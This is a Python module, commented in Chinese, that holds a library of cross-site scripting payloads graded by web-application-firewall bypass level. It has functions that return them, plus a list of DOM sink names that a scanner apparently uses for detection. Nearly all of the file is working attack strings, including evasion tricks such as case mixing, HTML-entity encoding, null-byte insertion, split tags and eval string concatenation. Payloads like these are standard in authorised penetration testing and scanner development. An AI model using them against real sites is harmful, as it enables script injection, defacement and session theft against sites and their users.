"""XSS Payload 库 — 分场景、分绕过等级"""

# ========== 基础探测 Payload（无 WAF 场景）==========
BASIC_PAYLOADS = [
    # 标准 script 标签
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "';alert(1);//",
    '</script><script>alert(1)</script>',
    # 事件触发
    '<img src=x onerror=alert(1)>',
    "<img src=x onerror=alert(1)>",
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    # 链接
    '<a href="javascript:alert(1)">click</a>',
    # iframe
    '<iframe src="javascript:alert(1)">',
    # 属性逃逸
    "' onfocus=alert(1) autofocus='",
    '" onfocus=alert(1) autofocus="',
    " onfocus=alert(1) autofocus=",
]

# ========== 轻度 WAF 绕过 ==========
MEDIUM_BYPASS_PAYLOADS = [
    # 大小写混淆
    '<ScRiPt>alert(1)</ScRiPt>',
    '<ImG sRc=x OnErRoR=alert(1)>',
    # 标签内空白
    '<img src = x onerror = alert(1)>',
    # 引号变体
    "<img src=x onerror=alert(1)>",
    "<img src=`x` onerror=alert(1)>",
    # 编码混淆
    '<img src=x onerror="alert(1)">',
    '<img src=x onerror=&#97;lert(1)>',
    '<img src=x onerror=alert&#40;1&#41;>',
    # 事件多样性
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    # 伪协议变体
    '<a href="&#106;avascript:alert(1)">click</a>',
    '<iframe src="data:text/html,<script>alert(1)</script>">',
]

# ========== 重度 WAF 绕过 ==========
ADVANCED_BYPASS_PAYLOADS = [
    # 标签拆分 + 注释
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<<script>script>alert(1)<</script>/script>',
    # 不可见字符
    '<img\x00src=x\x00onerror=alert(1)>',
    '<img\x09src=x\x09onerror=alert(1)>',
    # SVG 嵌套
    '<svg><svg onload=alert(1)>',
    '<svg><animatetransform onbegin=alert(1)>',
    # CSS 注入到 XSS
    '<div style="background:url(javascript:alert(1))">',
    # 模板字符串
    '<script>eval("al"+"ert(1)")</script>',
    '<script>Function("ale"+"rt(1)")()</script>',
    # import + data URI
    '<script>import("data:text/javascript,alert(1)")</script>',
    # 使用 HTML 实体编码完整标签
    "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
]

# ========== DOM-based XSS 检测 Sink ==========
DOM_SINKS = [
    "innerHTML",
    "outerHTML",
    "document.write(",
    "document.writeln(",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    "location.href",
    "location.replace(",
    "window.open(",
]


def get_payloads_by_level(level: str = "basic") -> list[str]:
    """根据绕过等级获取 Payload 列表"""
    if level == "basic":
        return BASIC_PAYLOADS
    elif level == "medium":
        return BASIC_PAYLOADS + MEDIUM_BYPASS_PAYLOADS
    elif level == "advanced":
        return BASIC_PAYLOADS + MEDIUM_BYPASS_PAYLOADS + ADVANCED_BYPASS_PAYLOADS
    return BASIC_PAYLOADS


def get_dom_sinks() -> list[str]:
    """获取 DOM XSS 危险 Sink 列表"""
    return DOM_SINKS
